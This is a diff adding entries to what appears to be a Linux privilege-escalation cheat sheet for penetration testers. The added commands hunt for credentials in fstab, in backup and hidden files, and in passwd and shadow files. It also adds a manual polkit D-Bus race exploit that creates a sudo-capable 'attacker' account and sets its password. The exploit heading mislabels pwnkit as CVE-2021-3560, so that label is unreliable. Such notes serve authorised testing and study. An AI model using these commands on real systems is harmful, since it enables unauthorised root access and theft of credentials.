@@ -17,7 +17,23 @@
 	`cat /etc/crontab`
 - Look for nfs exports
 	`cat /etc/exports`
-
+- Find unmounted drives
+	`ls /dev 2>/dev/null | grep -i "sd"`
+- Look for credentials in fstab
+	`grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null`
+- Look for mounted drives
+	`cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null`
+- Find hidden files
+	`find / -type f -iname ".*" -ls 2>/dev/null`
+- Look for backup files
+	`find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null`
+- Look for passwd and shadow files
+```bash
+#Passwd equivalent files
+cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
+#Shadow equivalent files
+cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
+```
 ## LD_PRELOAD
 If `env_keep += LD_PRELOAD` in sudoers:
 ```bash
@@ -68,6 +84,18 @@ strings /path/to/binary
 > If we find calls to an executable using relative path, we can create a malicious script using the binary name and update PATH to include the folder
 
 ## Local exploits
+### pwnkit (cve-2021-3560)
+- Last vulnerable package (ubuntu) : 0.105-26ubuntu1
+- Manual exploit (create attacker user with sudo rights)
+```bash
+# Create the user
+dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:attacker string:"Pentester Account" int32:1 & sleep 0.005s; kill $!
+# Create a password
+openssl passwd -6 mynewpassword
+# Set the password
+dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User1000 org.freedesktop.Accounts.User.SetPassword string:'$6$TRiYeJLXw8mLuoxS$UKtnjBa837v4gk8RsQL2qrxj.0P8c9kteeTnN.B3KeeeiWVIjyH17j6sLzmcSHn5HTZLGaaUDMC4MXCjIupp8.' string:'Ask the pentester' & sleep 0.005s; kill $!
+```
+
 ### Overwrite file with symlink
 Scenario : if root write a file in a folder for which you have write permission, it's possible to overwrite a file only root can write by creating a symlink to the target file.
 Example : https://0xdedinfosec.vercel.app/posts/hackthebox-timing-writeup
